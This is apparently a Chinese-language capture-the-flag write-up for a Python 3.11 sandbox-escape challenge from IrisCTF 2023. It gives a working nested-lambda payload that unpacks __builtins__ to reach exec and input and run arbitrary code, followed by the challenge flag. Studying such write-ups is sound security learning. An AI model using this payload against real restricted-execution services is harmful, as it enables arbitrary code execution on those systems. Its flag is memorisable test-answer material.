# 题目描述

obligatory unrealistic sandbox escape challenge!!!!!!! server runs python:3.11.1 docker!!!!!

# 解决方案

服务器会过滤所有常量，所有变量，只剩传递的两个参数`vars(), vars`可以利用，payload如下：

```python
lambda a, vars: (
    lambda __builtins__=None, **kw: (
        lambda exec, input, **k: exec(input())
    )(**vars(__builtins__))
)(**a)
```

发送payload即可拿到flag，为irisctf{i_made_this_challenge_so_long_ago_i_hope_there_arent_10000_with_this_idea_i_missed}，这道题需要熟悉python lambda语法，以及了解[compile函数](https://docs.python.org/3/library/functions.html?highlight=compile#compile)。

参考链接：

- https://github.com/Seraphin-/ctf/blob/master/irisctf2023/nameless.md